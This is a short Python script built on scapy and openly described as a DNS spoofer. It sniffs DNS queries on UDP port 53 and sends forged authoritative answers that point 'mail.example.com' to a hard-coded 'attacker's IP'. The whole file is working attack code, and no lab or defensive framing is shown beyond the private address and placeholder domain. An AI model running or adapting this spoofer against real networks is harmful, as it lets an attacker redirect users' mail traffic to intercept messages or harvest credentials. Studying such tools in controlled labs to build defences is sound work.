#!/usr/bin/env python3
"""
DNS Spoofing Script
Intercepts DNS queries and responds with fake answers
"""

from scapy.all import *
import sys

FAKE_IP = "172.20.0.40"  # Attacker's IP
TARGET_DOMAIN = "mail.example.com"

def dns_spoof(pkt):
    if pkt.haslayer(DNSQR):
        qname = pkt[DNSQR].qname.decode('utf-8')
        
        if TARGET_DOMAIN in qname:
            print(f"[+] Spoofing DNS response for {qname}")
            
            # Create spoofed DNS response
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                              an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=FAKE_IP))
            
            send(spoofed_pkt, verbose=0)
            print(f"[+] Sent spoofed response: {qname} -> {FAKE_IP}")

def main():
    print("[*] Starting DNS Spoofer...")
    print(f"[*] Target domain: {TARGET_DOMAIN}")
    print(f"[*] Fake IP: {FAKE_IP}")
    print("[*] Sniffing DNS queries...")
    
    # Sniff DNS queries on port 53
    sniff(filter="udp port 53", prn=dns_spoof, store=0)

if __name__ == "__main__":
    main()
